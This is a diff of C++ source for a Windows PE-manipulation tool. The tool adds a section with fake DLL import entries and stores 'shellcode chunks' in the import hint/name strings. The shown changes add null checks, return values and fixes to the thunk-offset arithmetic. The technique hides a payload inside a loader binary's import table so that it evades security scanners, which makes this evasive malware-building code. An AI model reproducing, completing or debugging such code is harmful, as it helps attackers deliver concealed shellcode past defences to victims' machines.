@@ -32,7 +32,7 @@ DWORD Rva2Offset(DWORD dwRva, PBYTE uiBaseAddress) {
 	return 0;
 }
 
-int CalculateNumberOfFakeEntries(uint64_t numberOfChunks,FAKEIMPORT* fakeImportList) {
+int CalculateNumberOfFakeEntries(int numberOfChunks,FAKEIMPORT* fakeImportList) {
 	int returnValue = 0;
 	char dllPath[MAX_PATH] = { 0x00 };
 	uint64_t dllSize = 0;
@@ -57,6 +57,10 @@ int CalculateNumberOfFakeEntries(uint64_t numberOfChunks,FAKEIMPORT* fakeImportL
 		fakeImportList[i].name = dllNames[i];
 		fakeImportList[i].numberOfImports = (numberOfChunks > numberOfNames) ? numberOfNames : numberOfChunks;
 		fakeImportList[i].offsetArray = (PBYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fakeImportList[i].numberOfImports);
+		if (fakeImportList[i].offsetArray == NULL) {
+			std::cout << "[!] Error on heap allocation !" << std::endl;
+			return 0;
+		}
 		numberOfChunks -= numberOfNames;
 	}
 	if (numberOfChunks > 0) {
@@ -123,8 +127,7 @@ LPCSTR* SelectDLLEntries(LPCSTR dllName, uint64_t numberOfDesiredFunctions) {
 		selectedIndexes[indexCounter] = *it; // Note the "*" here
 	}
 	LPCSTR* returnValue = GetImportNamesFromIndex(dllBuffer,selectedIndexes,numberOfDesiredFunctions);
-	HeapFree(GetProcessHeap(), MEM_RELEASE, dllBuffer);
-	HeapFree(GetProcessHeap(), MEM_RELEASE, selectedIndexes);
+	HeapFree(GetProcessHeap(), 0, selectedIndexes);
 	return returnValue;
 }
 
@@ -140,9 +143,12 @@ PBYTE AddNewSection(PBYTE oldFileBuffer, uint64_t oldFileSize, uint64_t numberOf
 	PIMAGE_SECTION_HEADER newSectionHeaderArray;
 	PBYTE newFileBuffer = NULL;
 	uint64_t functionStringLengths = 0;
-	int numberOfRequiredDLLs = 0;
 	uint64_t dllNamesSize = 0;
 	fakeImportList = (FAKEIMPORT*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, numberOfDllNames*sizeof(FAKEIMPORT));
+	if (fakeImportList == NULL) {
+		std::cout << "[!] Error on Heap Allocation !" << std::endl;
+		return NULL;
+	}
 	imageDosHeader = (PIMAGE_DOS_HEADER)oldFileBuffer;
 	imageNtHeader = (PIMAGE_NT_HEADERS)(oldFileBuffer + imageDosHeader->e_lfanew);
 	sectionHeaderArray = (PIMAGE_SECTION_HEADER)(((PBYTE)imageNtHeader) + sizeof(IMAGE_NT_HEADERS));
@@ -150,6 +156,9 @@ PBYTE AddNewSection(PBYTE oldFileBuffer, uint64_t oldFileSize, uint64_t numberOf
 	dwExistingImportDescriptorEntryCount = imageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size / sizeof(IMAGE_IMPORT_DESCRIPTOR);
 	// Actually on my computer, loader binary has one import.
 	numberOfRequiredDLLs = CalculateNumberOfFakeEntries(numberOfChunks,fakeImportList);
+	if (numberOfRequiredDLLs == 0) {
+		return NULL;
+	}
 	if (dwExistingImportDescriptorEntryCount == 0){
 		// the target process doesn't have any imported dll entries, 1 for last entry which is 0 and fakes
 		dwNewImportDescriptorEntryCount = numberOfRequiredDLLs +1;
@@ -161,7 +170,7 @@ PBYTE AddNewSection(PBYTE oldFileBuffer, uint64_t oldFileSize, uint64_t numberOf
 	// Select names from the DLLs
 	for (int i = 0; i < numberOfRequiredDLLs; i++) {
 		fakeImportList[i].nameofImports = SelectDLLEntries(fakeImportList[i].name, fakeImportList[i].numberOfImports);
-		if (fakeImportList[i].nameofImports) {
+		if (fakeImportList[i].nameofImports == NULL) {
 			std::cout << "[!] Error on reading DLL imports " << fakeImportList[i].name << std::endl;
 			return NULL;
 		}
@@ -222,7 +231,7 @@ PBYTE AddNewSection(PBYTE oldFileBuffer, uint64_t oldFileSize, uint64_t numberOf
 }
 
 
-void AddNewImportEntry(PBYTE fileBuffer,PWORD hintArray,uint64_t numberOfChunks) {
+bool AddNewImportEntry(PBYTE fileBuffer,PWORD hintArray,uint64_t numberOfChunks) {
 	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
 	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);
 	PIMAGE_SECTION_HEADER sectionHeaderArray = (PIMAGE_SECTION_HEADER)(((PBYTE)ntHeaders) + sizeof(IMAGE_NT_HEADERS));
@@ -239,6 +248,10 @@ void AddNewImportEntry(PBYTE fileBuffer,PWORD hintArray,uint64_t numberOfChunks)
 	uint64_t offsetCursor = 0;
 	uint64_t chunkIndex = 0;
 	uint64_t cursorOffsetForILT = 0;
+	if (newDllImportDescriptors == NULL) {
+		std::cout << "[!] Error on Heap Allocation !" << std::endl;
+		return false;
+	}
 	// Calculate the total length of function strings
 	for (int i = 0; i < numberOfRequiredDLLs; i++) {
 		for (int j = 0; j < fakeImportList[i].numberOfImports; j++) {
@@ -250,6 +263,7 @@ void AddNewImportEntry(PBYTE fileBuffer,PWORD hintArray,uint64_t numberOfChunks)
 	for (int i = 0; i < numberOfRequiredDLLs; i++) {
 		dllNamesSize = dllNamesSize + strlen(fakeImportList[i].name) + 1;
 	}
+	
 	if (dwExistingImportDescriptorEntryCount == 0)
 	{
 		// the target process doesn't have any imported dll entries - 1 for last and 1 for new
@@ -272,6 +286,7 @@ void AddNewImportEntry(PBYTE fileBuffer,PWORD hintArray,uint64_t numberOfChunks)
 		fakeImportList[i].nameAddr = freeMemoryStartAfterDir + offsetCursor;
 		offsetCursor = offsetCursor + strlen(fakeImportList[i].name) + 1;
 	}
+	
 	// Put shellcode chunks after the dll names
 	PIMAGE_IMPORT_BY_NAME hintNameEntries = (PIMAGE_IMPORT_BY_NAME)(freeMemoryStartAfterDir + dllNamesSize); 
 	offsetCursor = 0;
@@ -284,23 +299,27 @@ void AddNewImportEntry(PBYTE fileBuffer,PWORD hintArray,uint64_t numberOfChunks)
 			hintNameEntries = (PIMAGE_IMPORT_BY_NAME)(((PBYTE)hintNameEntries) + sizeof(WORD) + strlen(fakeImportList[i].nameofImports[j]) + 1);
 		}
 	}
-
+	
 	// Put the old directory
 	memcpy(sectionStart, oldDirectory, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);
 
 	PBYTE thunkAddress = freeMemoryStartAfterDir + dllNamesSize;
 	DWORD sectionStartOffset = sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].PointerToRawData;
 	DWORD sectionRVA = sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].VirtualAddress;
-
+	// True
 	// set import lookup table and import address table values
 
 	for (int i = 0; i < numberOfRequiredDLLs; i++) {
 		importLookupTableTemp = (PIMAGE_THUNK_DATA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1));
+		if (importLookupTableTemp == NULL) {
+			std::cout << "[!] Error on Heap Allocation !" << std::endl;
+			return false;
+		}
 		importLookupTableTemp[fakeImportList[i].numberOfImports].u1.AddressOfData = 0;
 		// RVA Calculation is section rva + raw offset from the raw offset of the section
 		importLookupTableTemp[0].u1.AddressOfData = (sectionRVA + (fakeImportList[i].offsetArray[0] - fileBuffer) - sectionStartOffset);
 		for (int j = 1; j < fakeImportList[i].numberOfImports; j++) {
-			importLookupTableTemp[i].u1.AddressOfData = (DWORD)(sectionRVA - sectionStartOffset + (fakeImportList[i].offsetArray[j] - fileBuffer));
+			importLookupTableTemp[j].u1.AddressOfData = (DWORD)(sectionRVA  + (fakeImportList[i].offsetArray[j] - fileBuffer) - sectionStartOffset);
 		}
 		// Copy ILT of ith fake dll entry
 		memcpy(freeMemoryStartAfterFunctionNames+cursorOffsetForILT, importLookupTableTemp, sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1));
@@ -330,8 +349,8 @@ void AddNewImportEntry(PBYTE fileBuffer,PWORD hintArray,uint64_t numberOfChunks)
 	newDllImportDescriptors[numberOfRequiredDLLs].FirstThunk = 0;
 
 	// TODO: Debug this value it may not be true
-	memcpy(sectionStart + dwNewImportDescriptorListDataLength - sizeof(newDllImportDescriptors), newDllImportDescriptors, sizeof(newDllImportDescriptors));
+	memcpy(sectionStart + dwNewImportDescriptorListDataLength - sizeof(IMAGE_IMPORT_DESCRIPTOR) * (numberOfRequiredDLLs + 1), newDllImportDescriptors, sizeof(IMAGE_IMPORT_DESCRIPTOR)* (numberOfRequiredDLLs + 1));
 	ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].VirtualAddress;
 	ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = dwNewImportDescriptorListDataLength;
-	
+	return true;
 }
